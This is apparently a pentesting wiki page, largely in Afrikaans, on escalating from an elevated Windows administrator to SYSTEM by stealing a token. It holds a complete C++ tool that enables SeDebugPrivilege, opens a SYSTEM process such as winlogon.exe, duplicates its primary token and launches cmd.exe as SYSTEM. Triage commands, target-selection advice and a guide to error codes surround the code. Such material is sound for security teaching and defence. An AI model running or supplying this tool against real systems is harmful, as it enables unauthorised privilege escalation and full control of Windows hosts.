# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy gaan oor die **manual** weergawe van om van ’n **High Integrity administrator process** na **`NT AUTHORITY\SYSTEM`** te gaan deur **’n nie-beskermde SYSTEM process oop te maak, sy token te duplicate, en ’n child process met daardie token te spawn**.

As jy net **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** het maar **nie ’n geskikte SYSTEM process kan oopmaak nie**, is die **Potato / named-pipe** pad gewoonlik meer betroubaar:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

As wat jy wil hê nie net `SYSTEM` is nie maar ’n **SYSTEM token met soveel privileges as moontlik**, kyk ook na:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Voordat jy probeer om ’n token te steel, valideer eers vinnig die context:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Praktiese notas:

- ’n **High Integrity** admin token is gewoonlik genoeg om **`SeDebugPrivilege` te aktiveer** en baie nie-beskermde SYSTEM prosesse oop te maak.
- **`CreateProcessWithTokenW` vereis `SeImpersonatePrivilege`** op die oproeper. As daardie API misluk met `1314`, skakel oor na `CreateProcessAsUserW` nadat jy reeds ’n SYSTEM primary token gedupliseer het.
- Op moderne Windows is **`lsass.exe` dikwels ’n slegte teiken** omdat **LSA protection / PPL** toegang blokkeer selfs vir administrators met `SeDebugPrivilege`. Verkies **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, of ’n vroeë **`svchost.exe`** wat as SYSTEM loop.
- Nie elke SYSTEM proses het ’n ewe bruikbare token nie. As jy SYSTEM kry maar ontbrekende privileges opmerk, probeer ’n ander SYSTEM proses in plaas daarvan om aan te neem die technique is gebreek.

## Kies die PID versigtig

Die maklikste manier om dit betroubaar te laat werk is om **’n SYSTEM proses te kies wie se DACL Administrators werklik toelaat om die proses te query en sy token te duplicate**.

Goeie kandidate om eerste te toets:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- sommige vroeë `svchost.exe` instances wat as SYSTEM loop

Vermy by verstek:

- `lsass.exe` op hosts waar **RunAsPPL / LSA protection** geaktiveer is
- beskermde / sekuriteits-gevoelige prosesse wat `Access denied` teruggee selfs nadat `SeDebugPrivilege` geaktiveer is

Jy kan kandidaat prosesse en hul tokens/ACLs inspekteer met **Process Explorer** of **Process Hacker** wat verhoog loop.

### Code

Die volgende code van [hier](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Dit laat toe om **’n Process ID as argument aan te dui** en ’n CMD **wat as die user van die aangeduide proses loop** sal uitgevoer word.\
Wanneer dit in ’n High Integrity proses loop, kan jy **die PID van ’n proses wat as System loop** aandui (soos `winlogon`, `wininit`) en ’n `cmd.exe` as SYSTEM uitvoer.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Nuttige API / toegangnota’s

Die voorbeeld gebruik `MAXIMUM_ALLOWED`, maar vir werklike operasies is dit nuttig om die minimum dele wat betrokke is te onthou:

- `OpenProcessToken()` vereis slegs dat die **process handle** oopgemaak is met **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Om `CreateProcessWithTokenW()` te gebruik, moet die **primary token handle** **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** hê.
- `DuplicateTokenEx()` moet ’n **primary token** (`TokenPrimary`) skep, nie net ’n impersonation token nie.
- As jy reeds SYSTEM geïmpersonifiseer het en `CreateProcessWithTokenW()` nog steeds misluk met `1314`, probeer eerder `CreateProcessAsUserW()`.

Dit beteken dat **om die teikenproses met `PROCESS_ALL_ACCESS` oop te maak gewoonlik onnodig is en meer geraas maak** as om net die regte te vra wat nodig is om die token te query.

## Fout

Op sommige geleenthede kan jy probeer om System te impersonate en dit sal nie werk nie, en ’n uitvoer soos die volgende wys:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
This means that even if you are running on a High Integrity level **you don't have enough permissions** over that target process/token.\
Let's check current Administrator permissions over `svchost.exe` processes with **Process Explorer** (or you can also use **Process Hacker**):

1. Select a process of `svchost.exe`
2. Right Click --> Properties
3. Inside "Security" Tab click in the bottom right the button "Permissions"
4. Click on "Advanced"
5. Select "Administrators" and click on "Edit"
6. Click on "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

The previous image contains all the privileges that "Administrators" have over the selected process (as you can see in case of `svchost.exe` they only have "Query" privileges)

See the privileges "Administrators" have over `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Inside that process "Administrators" can "Read Memory" and "Read Permissions" which probably allows Administrators to impersonate the token used by this process.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: the process DACL blocks you, or the target is **protected/PPL**. Pick another SYSTEM process.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: your token handle was opened without enough rights, or the target token DACL prevents duplication.
- **`CreateProcessWithTokenW()` -> `1314`**: the caller doesn't currently have **`SeImpersonatePrivilege`** enabled. Try enabling it first or use `CreateProcessAsUserW()` with the duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** after previous failures: this often just means the earlier token duplication/impersonation step failed, so there is no usable primary token to launch the child process.

## Operator notes

- This technique is great when you are already **local admin + high integrity** and just want a quick, manual path to SYSTEM without spinning up a service or a named-pipe coercion chain.
- On hardened Windows 11 / Server environments, **LSA protection is increasingly common**, so a workflow that assumes `lsass.exe` is always readable is brittle. **`winlogon.exe` / `wininit.exe` / `services.exe` are usually better first picks**.
- If you land in a **service account** context instead of an elevated admin desktop, the **Potato family** is usually a better fit than this page.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
